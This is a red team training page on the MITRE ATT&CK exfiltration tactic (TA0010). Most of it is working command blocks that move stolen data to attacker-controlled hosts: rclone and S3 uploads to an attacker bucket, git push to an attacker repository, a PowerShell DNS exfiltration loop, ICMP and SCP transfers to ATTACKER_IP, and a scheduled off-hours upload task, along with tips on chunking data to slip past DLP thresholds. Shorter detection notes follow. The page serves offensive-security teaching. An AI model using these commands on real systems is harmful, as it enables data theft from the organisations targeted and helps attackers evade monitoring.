---
layout: training-page
title: "TA0010 — Exfiltration — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - exfiltration
  - dns-exfil
  - cloud-exfil
  - data-transfer
page_key: "mitre-ta0010"
render_with_liquid: false
---

# TA0010 — Exfiltration

Exfiltration is the final active phase of most adversary operations — moving collected data out of the target environment to attacker-controlled infrastructure. The challenge is evading DLP controls, network monitoring, and size-based anomaly detection while transferring potentially large volumes of data. Modern DLP platforms inspect SSL traffic (via MITM proxy) and monitor egress to uncommon destinations, so exfiltration tradecraft has shifted to using trusted cloud services (S3, OneDrive, GitHub) and protocol-level tunneling.

Red team exfiltration is typically scoped carefully — clients want to see if data can be removed, but don't want actual exfiltration of sensitive data. Establish proof-of-exfiltration using synthetic data with clear labels.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1020 | Automated Exfiltration | T1020.001 Traffic Duplication | Mirror traffic to attacker (tap/SPAN) |
| T1030 | Data Transfer Size Limits | — | Split data into small chunks to evade DLP |
| T1048 | Exfil Over Alternative Protocol | T1048.001 Symmetric Encrypted Non-C2 | SCP, SFTP, custom encrypted channel |
| T1048 | Exfil Over Alternative Protocol | T1048.002 Asymmetric Encrypted Non-C2 | TLS/PGP encrypted non-HTTP channel |
| T1048 | Exfil Over Alternative Protocol | T1048.003 Unencrypted Non-C2 Protocol | FTP, raw TCP |
| T1041 | Exfiltration Over C2 Channel | — | Send data through existing HTTPS beacon |
| T1011 | Exfiltration Over Other Network Medium | T1011.001 Exfil Over Bluetooth | Bluetooth data transfer from isolated host |
| T1052 | Exfiltration Over Physical Medium | T1052.001 Exfil Over USB | Copy to USB drive, remove physically |
| T1567 | Exfiltration Over Web Service | T1567.001 Code Repository (GitHub) | git push to attacker-controlled repo |
| T1567 | Exfiltration Over Web Service | T1567.002 Cloud Storage (S3/GDrive) | Upload to attacker's cloud bucket |
| T1567 | Exfiltration Over Web Service | T1567.003 Text Storage (Pastebin) | POST data to pastebin/hastebin |
| T1567 | Exfiltration Over Web Service | T1567.004 File-Sharing Sites | WeTransfer, Dropbox, Box |
| T1029 | Scheduled Transfer | — | Exfiltrate in off-hours to avoid DLP scrutiny |
| T1537 | Transfer Data to Cloud Account | — | Move data to attacker's cloud account |

## Red Team Tooling

### C2 Channel Exfiltration (Simplest)

```
# Cobalt Strike — download file through beacon
download C:\Windows\Temp\stage_data.7z

# Meterpreter — download file
download C:\Windows\Temp\stage_data.7z /opt/loot/

# Sliver — download file
download C:\Windows\Temp\stage_data.7z
```

### Cloud Storage Exfiltration (Trusted Destination)

```
# AWS S3 — upload using stolen/attacker credentials
aws s3 cp C:\Windows\Temp\stage_data.7z s3://attacker-bucket/exfil/ \
  --no-sign-request   # if bucket is public

# From target (using rclone — sync to attacker's cloud)
rclone copy C:\Windows\Temp\staging\ attacker_remote:exfil_bucket/
# rclone.conf:
# [attacker_remote]
# type = s3
# provider = AWS
# access_key_id = ATTACKER_KEY
# secret_access_key = ATTACKER_SECRET
# region = us-east-1

# OneDrive / SharePoint (blend with M365 traffic)
# Upload via Graph API:
curl -X PUT -H "Authorization: Bearer TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root:/exfil/data.7z:/content" \
  --data-binary @stage_data.7z
```

### GitHub Repository Exfiltration

```
# Initialize git repo with collected data, push to attacker's GitHub
cd C:\Windows\Temp\staging\
git init
git config user.email "attacker@mail.com"
git config user.name "attacker"
git add .
git commit -m "update"
git remote add origin https://attacker:TOKEN@github.com/attacker/private-repo.git
git push origin main

# Advantage: GitHub traffic is trusted/allowed on most corporate networks
# Risk: GitHub logs push history, repo is discoverable
```

### DNS Exfiltration (Bypass DLP)

```
# dnscat2 — DNS-based exfil (slow but bypasses most DLP)
# In established dnscat2 shell:
upload C:\Windows\Temp\stage_data.7z    # transfers via DNS queries

# Manual DNS exfil (chunk data into hostname labels)
# Each DNS query = 63 bytes max label length
# Encode file as hex, send as subdomains:
# aGVsbG8=.c2.yourdomain.com (base64 chunks)

# PowerShell DNS exfil one-liner:
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secret.txt"))
$chunks = $data -split "(.{50})" | Where-Object { $_ }
foreach ($chunk in $chunks) {
    Resolve-DnsName "$chunk.exfil.yourdomain.com" -Type A -ErrorAction SilentlyContinue
}
```

### ICMP Exfiltration

```
# icmpsh — reverse shell doubles as data channel
# Manual ICMP exfil via ping data field:
# Windows — ping with custom data (up to 65500 bytes per packet)
ping -l 1000 -n 1 ATTACKER_IP    # legitimate, modify for data embedding

# Ncat over ICMP (nping)
nping --icmp-type 8 -c 1 ATTACKER_IP --data-string "$(base64 -w0 /tmp/data.txt)"
```

### SCP / SFTP Exfiltration

```
# SCP — direct copy to attacker SSH server
scp C:\Windows\Temp\stage_data.7z attacker@ATTACKER_IP:/opt/loot/

# SFTP session
sftp attacker@ATTACKER_IP
put C:\Windows\Temp\stage_data.7z /opt/loot/

# Via SOCKS proxy (if direct not possible)
proxychains scp -o ProxyJump=PIVOT user@INTERNAL_HOST:/path/file.7z /opt/loot/
```

### Scheduled/Off-Hours Transfer

```
# Schedule exfil during business hours (blends with normal traffic)
# Or at 2AM when DLP analysts are off-shift:
schtasks /create /tn "DataSync" /tr \
  "powershell.exe -c \"aws s3 cp C:\Windows\Temp\data.7z s3://bucket/\"" \
  /sc DAILY /st 02:00 /f
```

### Size Chunking to Evade DLP Volume Thresholds

```
# Split large archive into sub-10MB chunks
7z a -v10m split_archive.7z C:\Windows\Temp\staging\

# Exfil one chunk per hour via cron/scheduled task
# Each chunk below DLP single-transfer threshold
```

## Detection Notes

- **DLP volume triggers**: most DLP solutions alert on transfers >10-50MB to unusual destinations — chunking and spreading across time evades this; cloud storage to new accounts may still trigger
- **GitHub exfil**: unusual `git.exe` or `curl.exe` making connections to `github.com` with large POST bodies; Proxy logs show large uploads to `api.github.com`
- **DNS exfil**: high-entropy subdomains, unusually long FQDN queries (>50 chars), high query rate to single domain — Zeek/Corelight DNS anomaly detection rules cover this
- **S3/cloud upload**: proxy logs show large PUT/POST to `s3.amazonaws.com`, `storage.googleapis.com` from unusual hosts; AWS CloudTrail shows bucket activity from new IAM identity
- **ICMP**: data-bearing ICMP packets have non-zero payload — size and frequency anomaly; enterprise firewalls often block ICMP egress entirely
- **Off-hours transfers**: UEBA solutions flag after-hours file server or DLP activity from accounts that normally work business hours

## Related Academy Pages

- [Data Exfiltration](/post-exploitation/data-exfil/)
- [DNS Data Exfiltration](/post-exploitation/dns-exfil/)
- [ICMP Data Exfiltration](/post-exploitation/icmp-exfil/)
- [Cloud Service Exfiltration](/post-exploitation/cloud-exfil/)
- [Anti-Forensics & Evidence Cleanup](/post-exploitation/anti-forensics/)

## Resources

- [TA0010 — MITRE ATT&CK Exfiltration](https://attack.mitre.org/tactics/TA0010/)
- [T1567 — Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567/)
- [T1048 — Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
- [rclone Documentation](https://rclone.org/docs/)
